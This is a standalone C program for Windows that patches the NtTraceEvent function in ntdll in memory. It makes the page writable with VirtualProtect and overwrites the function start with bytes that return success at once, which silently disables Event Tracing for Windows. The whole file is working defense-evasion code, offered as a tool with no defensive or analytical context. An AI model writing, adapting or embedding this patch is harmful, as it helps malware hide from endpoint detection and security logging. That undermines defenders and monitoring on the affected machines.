#include <stdio.h>
#include <windows.h>
#include <windef.h>

// Patch ETW
int patch_etw(){
     #if defined(_M_X64)
        printf("[i] Architecture\t\tx86_64\n");
        // https://defuse.ca/online-x86-assembler.htm#disassembly
        // nop 
        // nop
        // xor rax, rax
        // ret
        // returns STATUS_SUCCESS
        unsigned char patch_bytes[] = { 0x90, 0x90, 0x48, 0x31, 0xC0, 0xC3 };
    #elif defined(_M_IX86) || defined(__i386__)
        printf("[i] Architecture\tx86\n");
        // xor eax, eax
        // ret 0x10
        unsigned char patch_bytes[] = { 0x31, 0xC0, 0xC2, 0x10, 0x00 };
    #else
        fprintf(stderr, "[!] Unsupported Architecture!\n");
        return -99;
    #endif

    printf("[i] Getting a handle to ntdll\n");
    HMODULE ntdll_handle = LoadLibrary("ntdll");
    if (NULL == ntdll_handle) {
        fprintf(stderr, "[!] Failed to load ntdll(Error Code: %d)\n", GetLastError());
        return -1;
    }

    printf("[i] Getting a handle to NtTraceEvent\n");
    FARPROC  nt_trace_event_addr = GetProcAddress(ntdll_handle, "NtTraceEvent");
    if (NULL == nt_trace_event_addr) {
        fprintf(stderr, "[!] Failed to get base address of NtTraceEvent(Error Code: %d)\n", GetLastError());
        return -2;
    }
    printf("[i] NtTraceEvent Offset\t0x%p\n", nt_trace_event_addr);
    
    printf("[i] Changing Memory Region Permission\n");
    DWORD oldprotect = 0;
    BOOL _vp = VirtualProtect((LPVOID)nt_trace_event_addr,
                                sizeof(patch_bytes),
                                PAGE_EXECUTE_READWRITE,
                                &oldprotect);
    if (!_vp){
        fprintf(stderr, "[!] VirtualProtect Failed(Error Code: %d)\n", GetLastError());
        return -3;
    }
    printf("[i] Original Protection: 0x%x\n", oldprotect);

    printf("[i] Copying Payload\n");
    memcpy(nt_trace_event_addr, patch_bytes, sizeof(patch_bytes));

    printf("[i] Restoring Permissions\n");
    DWORD _temp;
    _vp = VirtualProtect((LPVOID)nt_trace_event_addr,
                                sizeof(patch_bytes),
                                oldprotect,
                                &_temp);
    if (!_vp){
        fprintf(stderr, "[!] VirtualProtect Failed(Error Code: %d)\n", GetLastError());
        return -4;
    }

    return 0;
}


int main() {
    int result = patch_etw();
    if (result != 0) {
        fprintf(stderr, "[!] Failed to patch ETW!\n");
        return result;
    }

    printf("[i] Patched ETW\n");
    getchar();  
    return 0;
}